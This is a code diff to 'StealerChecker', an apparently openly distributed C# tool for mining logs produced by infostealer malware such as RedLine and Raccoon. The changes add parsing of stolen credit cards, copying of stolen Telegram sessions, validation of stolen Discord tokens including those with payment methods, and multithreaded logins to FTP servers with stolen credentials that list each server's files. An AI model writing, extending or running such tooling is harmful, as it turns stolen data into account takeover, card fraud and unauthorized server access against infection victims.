@@ -17,31 +17,16 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using TemnijExt;
-using static stealerchecker.Program;
 using Console = Colorful.Console;
+using File = System.IO.File;
 
 namespace stealerchecker
 {
-    public static class Program
+    public static partial class Program
     {
-        public class Options
-        {
-            [Option('p', "path", Required = true, HelpText = "Path to folder with logs")]
-            public string Path { get; set; }
-
-            [Option('v', "verbose", Required = false, HelpText = "Passwords view verbose mode")]
-            public bool Verbose { get; set; }
-
-            [Option('e', "everything", Required = false, HelpText = "Use Everything service")]
-            public bool Everything { get; set; }
-
-            [Option('a', "all", Required = false, HelpText = "Search all logs", Hidden = true)]
-            public bool All { get; set; }
-        }
-
         #region FIELDS
 
-        private const string tag = "8.7";
+        private const string tag = "9.1";
         private const string caption = $"StealerChecker v{tag} by Temnij";
         private static readonly List<Log> files = new();
         private static readonly List<string> directories = new();
@@ -53,7 +38,24 @@ namespace stealerchecker
             "UserInformation.txt", // RedLine
             "~Work.log", // DCRat Stealer mode
             "System Info.txt", // Raccoon Stealer
-            "_Information.txt" // Unknown stealer (44CALIBER?)
+            "_Information.txt", // Unknown stealer (44CALIBER?)
+            "information.txt", // COLLECTOR
+            "system_info.txt", // Unknown stealer
+            "readme.txt", // HUNTER
+            "LogInfo.txt", // Unknown Stealer
+        };
+        private static readonly List<string> names = new()
+        {
+            "Echelon",
+            "Echelon (mod)",
+            "RedLine",
+            "DCRat Stealer",
+            "Raccoon Stealer",
+            "Unknown stealer (44CALIBER?)",
+            "COLLECTOR",
+            "Unknown stealer",
+            "HUNTER",
+            "Unknown Stealer"
         };
         private static Options opt = new();
 
@@ -95,13 +97,19 @@ namespace stealerchecker
             }
             catch
             {
-                Console.WriteLine("Update error.. Seems, you are haven't internet connection..", Color.Pink);
+                Console.WriteLine("Update error.. Seems, you are haven't internet connection..\nPress any key...", Color.Pink);
                 Console.ReadKey();
             }
 
             #region LOADING
 
             Console.WriteLine("Please wait, loading...", Color.LightCyan);
+
+            if (Process.GetProcesses().Any(x => x.ProcessName.IndexOf("everything", StringComparison.OrdinalIgnoreCase) >= 0) && !opt.Everything)
+            {
+                Console.WriteLine("It looks like you are using Everything. Turn it on? [y/n]", Color.LightGreen);
+                opt.Everything = !Console.ReadLine().Equals("n", StringComparison.OrdinalIgnoreCase);
+            }
 
             if (!opt.Everything)
             {
@@ -124,6 +132,9 @@ namespace stealerchecker
 
             #endregion
 
+            //Console.WriteLine(GetAllHashes().Select(x => x.Key + " " + x.Value).Join());
+            //Console.ReadKey();
+
             while (true)
                 PrintMainMenu();
         }
@@ -136,9 +147,20 @@ namespace stealerchecker
         {
             files
                 .AddRange(directories
-                .SelectMany(dir => Directory.GetFiles(dir)
-                .Where(x => patterns.Contains(Path.GetFileName(x)))
-                .Select(x => new Log(x))));
+                .SelectMany(dir =>
+                {
+                    try
+                    {
+                        return Directory.GetFiles(dir)
+                                        .Where(x => patterns.Contains(Path.GetFileName(x)))
+                                        .Select(x => new Log(x));
+                    }
+                    catch
+                    {
+                        return new [] { new Log() };
+                    }
+                })
+                .Where(x => !string.IsNullOrEmpty(x.Name)));
         }
 
         #endregion
@@ -161,87 +183,145 @@ namespace stealerchecker
 
                         try
                         {
-                            Console.WriteLine(WriteCC(file.FullPath));
+                            Console.WriteLine(WriteCC(file.FullPath), Color.LightCyan);
                         }
                         catch { }
+                    }
+                }
+                else if (file.Name.Equals("UserInformation.txt"))
+                {
+                    var dir = new FileInfo(file.FullPath).DirectoryName;
+
+                    if (Directory.Exists(Path.Combine(dir, "CreditCards")))
+                    {
+                        foreach (var cardFile in Directory.GetFiles(Path.Combine(dir, "CreditCards")))
+                        {
+                            var matches = Regex.Matches(File.ReadAllText(cardFile), @"Holder: (.*)\s*CardType: (.*)\s*Card: (.*)\s*Expire: (.*)")
+                                .OfType<Match>()
+                                .Select(x =>
+                                new
+                                {
+                                    Holder = x.Groups[1].Value,
+                                    CardType = x.Groups[2].Value,
+                                    Card = x.Groups[3].Value,
+                                    Expire = x.Groups[4].Value
+                                })
+                                .Select(y => $"{y.CardType} | {y.Card} {y.Expire} {y.Holder}")
+                                .Join();
+                            if (!string.IsNullOrEmpty(matches))
+                            {
+                                Console.WriteLine(dir, Color.Green);
+                                Console.WriteLine(matches, Color.LightCyan);
+                            }
+                        }
+                    }
+                }
+                else if (file.Name.Equals("information.txt"))
+                {
+                    var dir = new FileInfo(file.FullPath).DirectoryName;
+
+                    if (Directory.Exists(Path.Combine(dir, "CC")))
+                    {
+                        foreach (var cardFile in Directory.GetFiles(Path.Combine(dir, "CC")))
+                        {
+                            var cc = File.ReadAllText(cardFile);
+                            if (!string.IsNullOrEmpty(cc))
+                            {
+                                Console.WriteLine(dir, Color.Green);
+                                Console.WriteLine(cc, Color.LightCyan);
+                            }
+                        }
+                    }
+                }
+                else if (file.Name.Equals("readme.txt"))
+                {
+                    var dir = new FileInfo(file.FullPath).DirectoryName;
+
+                    if (File.Exists(Path.Combine(dir, "Browser", "Cards.txt")))
+                    {
+                        var cc = File.ReadAllText(Path.Combine(dir, "Browser", "Cards.txt"));
+                        if (!string.IsNullOrEmpty(cc))
+                        {
+                            Console.WriteLine(dir, Color.Green);
+                            Console.WriteLine(cc, Color.LightCyan);
+                        }
                     }
                 }
             }
             SetStatus();
         }
         internal static string WriteCC(string path) =>
-            string.Join(NewLine, Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "Browsers", "Cards"))
+            Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "Browsers", "Cards"))
                 .Where(x => new FileInfo(x).Length > 5)
-                .Select(x => File.ReadAllText(x) + NewLine));
+                .Select(x => File.ReadAllText(x) + NewLine).Join();
 
         #endregion
         #region FTPs
 
         internal static void GetFTP()
         {
+            var ths = new List<Thread>();
+
+            int z = 0;
             foreach (var file in files)
             {
-                if (file.Name.Equals("InfoHERE.txt"))
+                ths.Add(new Thread(() =>
                 {
-                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
-                    var match = Regex.Match(File.ReadAllText(file.FullPath), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");
+                    SetStatus($"Getting... {Math.Round(GetPercent(files.Count, z++), 1)}%");
 
-                    var fileZila = match.Groups[1].Value.Equals("✅");
-                    var totalCmd = match.Groups[2].Value.Equals("✅");
-
-                    if (fileZila)
+                    if (file.Name.Equals("InfoHERE.txt"))
                     {
-                        Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
-                        Console.WriteLine(" - FileZila");
+                        var match = Regex.Match(File.ReadAllText(file.FullPath), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");
 
-                        WriteFileZila(file.FullPath);
+                        var fileZila = match.Groups[1].Value.Equals("✅");
+
+                        if (fileZila)
+                        {
+                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
+                            Console.WriteLine(" - FileZila");
+
+                            WriteFileZila(file.FullPath);
+                        }
                     }
-                    if (totalCmd)
+                    else if (file.Name.Equals("InfoHERE.html"))
                     {
-                        Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
-                        Console.WriteLine(" - Total Commander");
+                        var match = Regex.Match(File.ReadAllText(file.FullPath), "<h2 style=\"color:white\">📡 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>");
 
-                        Console.WriteLine(WriteTotalCmd(file.FullPath));
+                        var fileZila = match.Groups[1].Value.Equals("✅");
+
+                        if (fileZila)
+                        {
+                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
+                            Console.WriteLine(" - FileZila");
+
+                            WriteFileZila(file.FullPath);
+                        }
                     }
-                }
-                else if (file.Name.Equals("InfoHERE.html"))
-                {
-                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
-                    var match = Regex.Match(File.ReadAllText(file.FullPath), "<h2 style=\"color:white\">📡 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>");
-
-                    var fileZila = match.Groups[1].Value.Equals("✅");
-                    var totalCmd = match.Groups[2].Value.Equals("✅");
-
-                    if (fileZila)
+                    else if (file.Name.Equals("UserInformation.txt"))
                     {
-                        Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
-                        Console.WriteLine(" - FileZila");
+                        var logFolder = new FileInfo(file.FullPath).Directory.FullName;
+                        if (Directory.Exists(Path.Combine(logFolder, "FTP"))
+                            && File.Exists(Path.Combine(logFolder, "FTP", "Credentials.txt")))
+                        {
+                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
+                            Console.WriteLine(" - FTP");
 
-                        WriteFileZila(file.FullPath);
+                            CheckRedlineFtp(File.ReadAllText(Path.Combine(logFolder, "FTP", "Credentials.txt")));
+                        }
                     }
-                    if (totalCmd)
-                    {
-                        Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
-                        Console.WriteLine(" - Total Commander");
-
-                        Console.WriteLine(WriteTotalCmd(file.FullPath));
-                    }
-                }
-                else if (file.Name.Equals("UserInformation.txt"))
-                {
-                    var logFolder = new FileInfo(file.FullPath).Directory.FullName;
-                    if (Directory.Exists(Path.Combine(logFolder, "FTP"))
-                        && File.Exists(Path.Combine(logFolder, "FTP", "Credentials.txt")))
-                    {
-                        Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
-                        Console.WriteLine(" - FTP");
-
-                        CheckRedlineFtp(File.ReadAllText(Path.Combine(logFolder, "FTP", "Credentials.txt")));
-                    }
-                }
+                }));
             }
 
-            Console.WriteLine($"Good FTPs:\n{string.Join(NewLine, goodFTPs.Distinct())}", Color.LightGreen);
+            foreach (var item in ths) item.Start();
+
+            int i = 0;
+            foreach (var item in ths)
+            {
+                SetStatus($"Checking... {Math.Round(GetPercent(ths.Count, i++), 1)}%");
+                item.Wait();
+            }
+
+            Console.WriteLine($"Good FTPs:{NewLine + goodFTPs.Distinct().Join()}", Color.LightGreen);
             File.WriteAllLines("goodFTPs.txt", goodFTPs.Distinct());
             goodFTPs.Clear();
 
@@ -252,11 +332,15 @@ namespace stealerchecker
             var fileZilaFolder = Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "FileZilla"))
                 .Where(x => new FileInfo(x).Length > 5);
 
+            var ths = new List<Thread>();
+
             foreach (var file in fileZilaFolder)
             {
-                CheckFileZilla(File.ReadAllText(file));
-                Console.WriteLine();
+                ths.Add(new Thread(() => CheckFileZilla(File.ReadAllText(file))));
             }
+
+            foreach (var item in ths) item.Start();
+            foreach (var item in ths) item.Wait();
         }
 
         private static readonly List<string> goodFTPs = new();
@@ -275,8 +359,8 @@ namespace stealerchecker
 
                 try
                 {
-                    SetStatus($"Checking {obj.Host}...");
-                    FtpClient client = new(obj.Host)
+                    //SetStatus($"Checking {obj.Host}...");
+                    using FtpClient client = new(obj.Host)
                     {
                         Port = int.Parse(obj.Port),
                         Credentials = new NetworkCredential(obj.User, obj.Pass),
@@ -287,17 +371,23 @@ namespace stealerchecker
                     };
 
                     client.Connect();
+                    var info = NewLine +
+                        client.GetListing("/")
+                        .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
+                        .Join() + NewLine;
                     client.Disconnect();
 
-                    Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD", Color.LightGreen);
-                    goodFTPs.Add($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD");
+                    var fullInfo = $"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD" + info;
+
+                    //Console.WriteLine(fullInfo, Color.LightGreen);
+                    goodFTPs.Add(fullInfo);
                 }
                 catch (FtpAuthenticationException)
                 {
                     try
                     {
-                        SetStatus($"Checking for anonymous auth {obj.Host}...");
-                        FtpClient client = new(obj.Host)
+                        //SetStatus($"Checking for anonymous auth {obj.Host}...");
+                        using FtpClient client = new(obj.Host)
                         {
                             Port = int.Parse(obj.Port),
                             Credentials = new NetworkCredential("anonymous", ""),
@@ -308,18 +398,25 @@ namespace stealerchecker
                         };
 
                         client.Connect();
+                        var info = NewLine +
+                            client.GetListing("/")
+                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
+                            .Join() + NewLine;
                         client.Disconnect();
 
-                        Console.WriteLine($"{obj.Host}:{obj.Port};anonymous: - GOOD", Color.LightGreen);
+                        var fullInfo = $"{obj.Host}:{obj.Port};anonymous: - GOOD" + info;
+
+                        //Console.WriteLine(fullInfo, Color.LightGreen);
+                        goodFTPs.Add(fullInfo);
                     }
                     catch
                     {
-                        Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
+                        //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                     }
                 }
                 catch
                 {
-                    Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
+                    //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                 }
             }
         }
@@ -338,8 +435,8 @@ namespace stealerchecker
 
                 try
                 {
-                    SetStatus($"Checking {obj.Host}...");
-                    FtpClient client = new(obj.Host)
+                    //SetStatus($"Checking {obj.Host}...");
+                    using FtpClient client = new(obj.Host)
                     {
                         Port = int.Parse(obj.Port),
                         Credentials = new NetworkCredential(obj.User, obj.Pass),
@@ -350,17 +447,23 @@ namespace stealerchecker
                     };
 
                     client.Connect();
+                    var info = NewLine +
+                            client.GetListing("/")
+                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
+                            .Join() + NewLine;
                     client.Disconnect();
 
-                    Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD", Color.LightGreen);
-                    goodFTPs.Add($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD");
+                    var fullInfo = $"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD" + info;
+
+                    //Console.WriteLine(fullInfo, Color.LightGreen);
+                    goodFTPs.Add(fullInfo);
                 }
                 catch (FtpAuthenticationException)
                 {
                     try
                     {
-                        SetStatus($"Checking for anonymous auth {obj.Host}...");
-                        FtpClient client = new(obj.Host)
+                        //SetStatus($"Checking for anonymous auth {obj.Host}...");
+                        using FtpClient client = new(obj.Host)
                         {
                             Port = int.Parse(obj.Port),
                             Credentials = new NetworkCredential("anonymous", ""),
@@ -371,68 +474,92 @@ namespace stealerchecker
                         };
 
                         client.Connect();
+                        var info = NewLine +
+                            client.GetListing("/")
+                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
+                            .Join() + NewLine;
                         client.Disconnect();
 
-                        Console.WriteLine($"{obj.Host}:{obj.Port};anonymous: - GOOD", Color.LightGreen);
+                        var fullInfo = $"{obj.Host}:{obj.Port};anonymous: - GOOD" + info;
+
+                        //Console.WriteLine(fullInfo, Color.LightGreen);
+                        goodFTPs.Add(fullInfo);
                     }
                     catch
                     {
-                        Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
+                        //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                     }
                 }
                 catch
                 {
-                    Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
+                    //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                 }
             }
         }
         internal static string WriteTotalCmd(string path) =>
-            string.Join(NewLine, Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "FTP", "Total Commander"))
-                .Where(x => new FileInfo(x).Length > 5)
-                .Select(x => File.ReadAllText(x) + NewLine));
+            Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "FTP", "Total Commander"))
+            .Where(x => new FileInfo(x).Length > 5)
+            .Select(x => File.ReadAllText(x) + NewLine)
+            .Join();
 
         #endregion
         #region DISCORD
 
         internal static void GetDiscord()
         {
-            List<string> tokens = new();
+            //var ths = new List<Thread>();
+            List<Models.CheckResult> tokens = new();
 
             foreach (var file in files)
             {
-                var info = new FileInfo(file.FullPath);
-                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
+                //ths.Add(new Thread(() =>
+                //{
+                    var info = new FileInfo(file.FullPath);
+                    SetStatus($"Working... {Math.Round(GetPercent(files.Count, files.IndexOf(file), 100M), 3)}%");
 
-                if (info.Name.Equals("InfoHERE.txt")
-                    || info.Name.Equals("InfoHERE.html"))
-                {
-                    var match = Regex.Match(File.ReadAllText(file.FullPath), "💬 Discord: (✅|❌)");
-
-                    var discord = match.Groups[1].Value.Equals("✅");
-
-                    try
+                    if (info.Name.Equals("InfoHERE.txt")
+                        || info.Name.Equals("InfoHERE.html"))
                     {
-                        if (discord)
+                        var match = Regex.Match(File.ReadAllText(file.FullPath), "💬 Discord: (✅|❌)");
+
+                        var discord = match.Groups[1].Value.Equals("✅");
+
+                        try
+                        {
+                            if (discord)
+                                tokens.AddRange(WriteDiscord(file.FullPath));
+                        }
+                        catch { }
+                    }
+                    else
+                    {
+                        try
+                        {
                             tokens.AddRange(WriteDiscord(file.FullPath));
+                        }
+                        catch { }
                     }
-                    catch { }
-                }
-                else if (info.Name.Equals("UserInformation.txt") || info.Name.Equals("~Work.log"))
-                {
-                    try
-                    {
-                        tokens.AddRange(WriteDiscord(file.FullPath));
-                    }
-                    catch { }
-                }
+                //}));
             }
+
+            //foreach (var item in ths) item.Start();
+
+            //int i = 0;
+            //foreach (var item in ths)
+            //{
+            //    SetStatus($"Working... {50 + Math.Round(GetPercent(ths.Count, i++, 50M), 2)}%");
+            //    item.Wait();
+            //}
+
             SetStatus();
 
-            File.WriteAllLines("DiscordTokens.txt", tokens.Distinct());
+            File.WriteAllLines("DiscordTokens_All.txt", tokens.Distinct().Select(x => x.Token));
+            File.WriteAllLines("DiscordTokens_Working.txt", tokens.Distinct().Where(x => x.IsValid).Select(x => x.Token));
+            File.WriteAllLines("DiscordTokens_WithPayment.txt", tokens.Distinct().Where(x => x.Payment).Select(x => x.Token));
         }
-        internal static List<string> WriteDiscord(string path)
+        internal static List<Models.CheckResult> WriteDiscord(string path)
         {
-            List<string> tokensList = new();
+            List<Models.CheckResult> tokensList = new();
 
             var filecl = FileCl.Load(path);
             var dir = filecl.Info.Directory.FullName;
@@ -445,6 +572,10 @@ namespace stealerchecker
                 discordDir = Path.Combine(dir, "Discord");
             else if (name.Equals("~Work.log"))
                 discordDir = Path.Combine(dir, "Other");
+            else if (name.Equals("information.txt"))
+                discordDir = Path.Combine(dir, "Discord", "botty");
+            else if (name.Equals("LogInfo.txt"))
+                discordDir = Path.Combine(dir, "Discord", "leveldb");
 
             foreach (var file in Directory.GetFiles(discordDir))
             {
@@ -456,19 +587,8 @@ namespace stealerchecker
                         var tokens = CheckDiscord(thisFile.GetContent());
                         if (tokens.Any())
                         {
-                            Console.WriteLine();
-                            var newfile = "";
-                            if (File.Exists(file))
-                                if (name.Equals("InfoHERE.txt") || name.Equals("InfoHERE.html"))
-                                    newfile = FileCl.Load(file).Info.Directory.Parent.Parent.Parent.FullName;
-                                else if (name.Equals("UserInformation.txt") || name.Equals("~Work.log"))
-                                    newfile = FileCl.Load(file).Info.Directory.Parent.FullName;
-
-                            Console.Write($"[{newfile}]", Color.Green);
-                            Console.WriteLine(" - Discord");
-
-                            Console.WriteLine($"{string.Join(NewLine, tokens.Where(x => x.Length > 5))}", Color.LightGreen);
-                            tokensList.AddRange(tokens);
+                            Console.WriteLine($"{tokens.Join()}", Color.LightGreen);
+                            tokensList.AddRange(tokens.Select(x => DiscordChecker.CheckToken(x)));
                         }
                     }
                 }
@@ -493,7 +613,7 @@ namespace stealerchecker
         internal static void SearchByURL(string query)
         {
             SetStatus("Working... ");
-            Console.WriteLine(string.Join(NewLine, SearchByURLHerlper(query)), Color.LightGreen);
+            Console.WriteLine(SearchByURLHerlper(query).Join(), Color.LightGreen);
             SetStatus();
         }
         private static IEnumerable<string> SearchByURLHerlper(string query) => glob
@@ -507,7 +627,7 @@ namespace stealerchecker
         internal static void SearchByUsername(string query)
         {
             SetStatus("Working... ");
-            Console.WriteLine(string.Join(NewLine, SearchByUsernameHelper(query)), Color.LightGreen);
+            Console.WriteLine(SearchByUsernameHelper(query).Join(), Color.LightGreen);
             SetStatus();
         }
         private static IEnumerable<string> SearchByUsernameHelper(string query) => glob
@@ -521,7 +641,7 @@ namespace stealerchecker
         internal static void SearchByPass(string query)
         {
             SetStatus("Working... ");
-            Console.WriteLine(string.Join(NewLine, SearchByPassHelper(query)), Color.LightGreen);
+            Console.WriteLine(SearchByPassHelper(query).Join(), Color.LightGreen);
             SetStatus();
         }
         private static IEnumerable<string> SearchByPassHelper(string query) => glob
@@ -550,10 +670,18 @@ namespace stealerchecker
                     {
                         CopyTelegram(file.FullPath);
                     }
-                    else if (fn.Equals("~Work.log") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Other", "Telegram", "tdata")))
-                    {
-                        CopyTelegram(file.FullPath);
-                    }
+                }
+                else if (fn.Equals("~Work.log") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Other", "Telegram", "tdata")))
+                {
+                    CopyTelegram(file.FullPath);
+                }
+                else if (fn.Equals("UserInformation.txt") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Telegram", "Profile_1")))
+                {
+                    CopyTelegram(file.FullPath);
+                }
+                else if (fn.Equals("LogInfo.txt") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Telegram")))
+                {
+                    CopyTelegram(file.FullPath);
                 }
             }
             SetStatus();
@@ -588,7 +716,7 @@ namespace stealerchecker
 
             goto again;
         }
-        internal static void CopyTelegram(string path)
+        internal static void CopyTelegram(in string path)
         {
             var filecl = FileCl.Load(path);
             var dir = filecl.Info.Directory.FullName;
@@ -599,10 +727,15 @@ namespace stealerchecker
                 tgDir = Array.Find(Directory.GetDirectories(dir), x => new DirectoryInfo(x).Name.StartsWith("Telegram"));
             else if (fn.Equals("~Work.log"))
                 tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Other", "Telegram", "tdata");
+            else if (fn.Equals("UserInformation.txt"))
+                tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Telegram", "Profile_1"); // TODO: доделать, я огурец.
+            else if (fn.Equals("LogInfo.txt"))
+                tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Telegram"); // TODO: доделать, я огурец.
 
             CopyFiles(tgDir, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
-            counter++;
-            SetStatus($"{counter} telegram dirs copied");
+            if (fn.Equals("LogInfo.txt"))
+                CopyFiles(Path.Combine(tgDir, "tdata"), Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
+            SetStatus($"{counter++} telegram dirs copied");
         }
 
         private static void CopyFiles(string sourcePath, string targetPath)
@@ -671,11 +804,13 @@ namespace stealerchecker
             Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);
 
             if (!Directory.Exists("Sorts"))
+            {
                 Directory.CreateDirectory("Sorts");
+            }
             else
             {
                 Console.WriteLine("Directory exists, deleting...", Color.Pink);
-                deleteFolder("Sorts");
+                DeleteFolder("Sorts");
                 Console.WriteLine("Deleted!", Color.LightGreen);
                 Directory.CreateDirectory("Sorts");
             }
@@ -699,7 +834,7 @@ namespace stealerchecker
 
             Console.WriteLine("Sorted!", Color.Green);
         }
-        private static void deleteFolder(string folder)
+        private static void DeleteFolder(string folder)
         {
             try
             {
@@ -710,7 +845,7 @@ namespace stealerchecker
 
                 foreach (DirectoryInfo df in diA)
                 {
-                    deleteFolder(df.FullName);
+                    DeleteFolder(df.FullName);
                     if (df.GetDirectories().Length == 0 && df.GetFiles().Length == 0) df.Delete();
                 }
             }
@@ -759,29 +894,23 @@ namespace stealerchecker
         {
             List<Password> passwords = new();
 
-            SetStatus($"Loading... {progress}%... Processing...");
-            int max = 0;
-            try
-            {
-                max = Convert.ToInt32(Math.Round((decimal)files.Count / 10));
-            }
-            catch { }
+            SetStatus($"Loading [1/2]... {progress}%... Processing...");
+            int max = files.Count;
             int counter = 0;
 
             // array optimization
-            Log[] array = files.ToArray();
+            Log[] array = files.Shuffle().ToArray();
 
             for (int i = 0; i < array.Length; i++)
             {
                 Log filePas = array[i];
 
-                if (counter % max == 0 && max > 10)
+                try
                 {
-                    progress++;
-                    SetStatus($"Loading... {progress}%... Processing...");
+                    if(counter > 10 && counter % 10 == 0)
+                        SetStatus($"Loading [2/2]... {Math.Round(GetPercent(max, counter), 1)}%... Processing...");
                 }
-
-                var pas = new List<Password>();
+                catch { }
                 var filecl = FileCl.Load(filePas.FullPath);
                 var dir = filecl.Info.Directory.FullName;
 
@@ -789,70 +918,86 @@ namespace stealerchecker
                 {
                     var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");
 
-                    try
+                    if (File.Exists(Path.Combine(passwordsDir, "ChromiumV2.txt")))
                     {
-                        foreach (var file in Directory.GetFiles(passwordsDir))
+                        try
                         {
-                            var thisFile = FileCl.Load(file);
-                            try
-                            {
-                                if (thisFile.Info.Name.Equals("ChromiumV2.txt"))
-                                {
-                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");
+                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "ChromiumV2.txt")).Replace("\r", ""), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");
 
-                                    pas.AddRange(log.OfType<Match>()
-                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
-                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
-                                }
-                                else if (thisFile.Info.Name.Equals("Passwords_Google.txt"))
-                                {
-                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");
-
-                                    pas.AddRange(log.OfType<Match>()
-                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
-                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
-                                }
-                                else if (thisFile.Info.Name.Equals("Passwords_Mozilla.txt"))
-                                {
-                                    var log = Regex.Matches(thisFile.GetContent(), @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");
-
-                                    pas.AddRange(log.OfType<Match>()
-                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
-                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
-                                }
-                                else if (thisFile.Info.Name.Equals("Passwords_Opera.txt"))
-                                {
-                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");
-
-                                    pas.AddRange(log.OfType<Match>()
-                                        .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value))
-                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
-                                }
-                                else if (thisFile.Info.Name.Equals("Passwords_Unknown.txt"))
-                                {
-                                    var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");
-
-                                    pas.AddRange(log.OfType<Match>()
-                                        .Select(match => new Password(match.Groups[1].Value.Replace("\r", ""), match.Groups[2].Value.Replace("\r", ""), match.Groups[3].Value.Replace("\r", "")))
-                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
-                                }
-                            }
-                            catch { }
+                            passwords.AddRange(log.OfType<Match>()
+                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
+                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
+                        catch
+                        {
                         }
                     }
-                    catch
+                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Google.txt")))
                     {
+                        try
+                        {
+                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Google.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");
+
+                            passwords.AddRange(log.OfType<Match>()
+                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
+                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
+                        catch
+                        {
+                        }
+                    }
+                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Mozilla.txt")))
+                    {
+                        try
+                        {
+                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Mozilla.txt")).Replace("\r", ""), @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");
+
+                            passwords.AddRange(log.OfType<Match>()
+                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
+                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                        }
+                        catch
+                        {
+                        }
+                    }
